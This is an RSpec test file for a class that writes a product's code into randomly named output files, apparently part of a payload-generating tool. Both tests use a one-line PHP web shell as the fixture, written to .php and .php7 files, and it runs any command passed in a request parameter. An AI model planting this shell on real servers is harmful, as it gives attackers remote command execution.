################################################################################
#                                                                              #
# Test cases                                                                   #
#                                                                              #
################################################################################

describe GenerateOutputFileAction do
  it 'creates a file containing the product code and a random name' do
    code = '<?php system($_REQUEST["cmd"]); ?>'
    extension = 'php'
    run_creates_file_scenario(code, extension)
  end

  it 'creates a different file containing the product code and a random name' do
    code = '<?php system($_REQUEST["cmd"]); ?>'
    extension = 'php7'
    run_creates_file_scenario(code, extension)
  end
end

################################################################################
#                                                                              #
# Test scenarios to reduce test code duplication                               #
#                                                                              #
################################################################################

def run_creates_file_scenario(code, extension)
  # Mock the SecureRandom's module hex method
  filename = Random.hex(32)
  expect(SecureRandom).to receive(:hex).with(32).and_return(filename)

  # Create a virtual filesystem
  FakeFS.with_fresh do
    # Create a product
    product = Product.new
    product.code = code

    # Create and run the action
    file_info = FileInfo.new(extension)
    action = GenerateOutputFileAction.new(file_info)
    action.transform(product)

    # Expect the file to have been created
    File.open("#{filename}.#{extension}", 'r') do |f|
      expect(f.read).to eq(code)
    end
  end
end
